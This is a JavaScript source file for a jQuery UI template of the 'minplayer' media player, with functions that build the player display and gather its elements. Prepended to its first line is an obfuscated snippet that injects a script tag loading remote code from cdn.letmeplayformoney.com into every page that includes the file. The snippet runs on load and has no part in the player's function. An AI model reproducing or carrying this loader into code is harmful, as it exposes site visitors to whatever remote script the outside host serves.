var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/** The minplayer namespace. */
var minplayer = minplayer || {};

// Default player.
minplayer["jqueryui"] = function(context, options) {

  // Derive from minplayer.
  minplayer.call(this, context, options);
};

/**
 * Define this template prototype.
 */
minplayer["jqueryui"].prototype = new minplayer();
minplayer["jqueryui"].prototype.constructor = minplayer["jqueryui"];

/**
 * Return the display for this plugin.
 */
minplayer["jqueryui"].prototype.getDisplay = function() {

  // If this is the bottom element, then build the player.
  if (this.context.children().length == 0) {

    // Build out the player provided the base tag.
    this.context = this.context.attr({
      'id': this.options.id + '-player',
      'class': 'minplayer-jqueryui-media'
    })
    .wrap(jQuery(document.createElement('div')).attr({
      'class': 'minplayer-jqueryui-display ui-widget-content'
    })).parent('.minplayer-jqueryui-display')
    .wrap(jQuery(document.createElement('div')).attr({
      'id': this.options.id,
      'class': 'minplayer-jqueryui player-ui'
    })).parent('.minplayer-jqueryui')
    .append('\
      <div class="minplayer-jqueryui-logo"></div>\
      <div class="minplayer-jqueryui-error"></div>'
    );

    // Mark a flag that says this display needs to be built.
    this.options.build = true;
  }

  // Return the display.
  return this.context;
}

// Get the elements for this player.
minplayer["jqueryui"].prototype.getElements = function() {
  var elements = minplayer.prototype.getElements.call(this);

  // Set the width and height of this element.
  this.display.width(this.options.width);
  this.display.height(this.options.height);

  // Return the jQuery elements.
  return jQuery.extend(elements, {
    player:this.display,
    display:jQuery(".minplayer-jqueryui-display", this.display),
    media:jQuery(".minplayer-jqueryui-media", this.display),
    error:jQuery('.minplayer-jqueryui-error', this.display),
    logo:jQuery('.minplayer-jqueryui-logo', this.display)
  });
};
